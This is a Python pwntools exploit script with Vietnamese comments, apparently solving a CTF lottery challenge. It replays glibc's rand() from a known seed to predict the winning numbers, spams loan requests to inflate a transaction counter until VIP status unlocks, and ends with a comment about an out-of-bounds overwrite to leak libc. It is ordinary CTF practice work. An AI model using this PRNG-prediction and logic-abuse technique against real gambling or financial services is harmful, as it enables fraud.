#!/usr/bin/env python3

from pwn import *
import ctypes

# 1. Load thư viện glibc để đồng bộ PRNG
libc = ctypes.CDLL("libc.so.6")

# Kết nối tới server CTF
# p = remote('IP_SERVER', PORT)
p = process('./chall_patched') # Chạy local để test

def get_round_2_numbers():
    so_nha_cai = [0] * 7
    libc.srand(4733) # Seed cố định cho Round 1
    
    # Bỏ qua Round 1 (chạy cho trôi trạng thái rand)
    for i in range(7):
        while True:
            v4 = (libc.rand() % 37) + 1
            if v4 not in so_nha_cai[:i]:
                break
        so_nha_cai[i] = v4
        
    # Lấy Seed và sinh số cho Round 2 (ROUND QUYẾT ĐỊNH)
    next_seed = libc.rand() % 4919
    libc.srand(next_seed)
    so_nha_cai_r2 = [0] * 7
    for i in range(7):
        while True:
            v4 = (libc.rand() % 37) + 1
            if v4 not in so_nha_cai_r2[:i]:
                break
        so_nha_cai_r2[i] = v4
        
    return so_nha_cai_r2

# 2. Sinh sẵn 7 con số của Round 2 (sẽ là: 10, 1, 30, 24, 2, 15, 26)
r2_winning_numbers = get_round_2_numbers()
print(f"[*] So trung thuong Round 2: {r2_winning_numbers}")

# === THỰC THI KHAI THÁC ===

# Lượt 1: Đánh bừa để qua dòng đời (vì mình ko biết số trước khi nó in ra)
p.sendlineafter(b"Lua chon : ", b"5")
for i in range(7):
    p.sendlineafter(b": ", str(i+1).encode()) # Đánh bừa 1 2 3 4 5 6 7

# Lượt 2: TẤT TAY VÀO DÃY SỐ ĐÃ DỰ ĐOÁN ĐỂ TRÚNG 2 TỶ!
p.sendlineafter(b"Lua chon : ", b"5")
for num in r2_winning_numbers:
    p.sendlineafter(b": ", str(num).encode())

print("[+] Da trung 2 Ty! Bat dau spam tang transaction_count...")

# Lượt 3: Spam tính năng Vay nợ (hoặc Nhận thưởng) để cày transaction_count lên 21+
# Lưu ý: Sửa số '4' thành số tương ứng của menu Nhận thưởng/Vay nợ nếu cần
for _ in range(20):
    p.sendlineafter(b"Lua chon : ", b"4") # Chọn Vay No
    p.sendlineafter(b": ", b"100")        # Vay đại 100 đồng

print("[+] Da dat du dieu kien VIP. Kich hoat VIP!")
p.sendlineafter(b"Lua chon : ", b"0")     # Kích hoạt check_upgrage_vip() nếu nó nằm ở Menu

# Từ đây, bạn có thể thực hiện OOB đè mảng memo để leak Libc hoặc đè con trỏ VIP như đã bàn!
# p.interactive()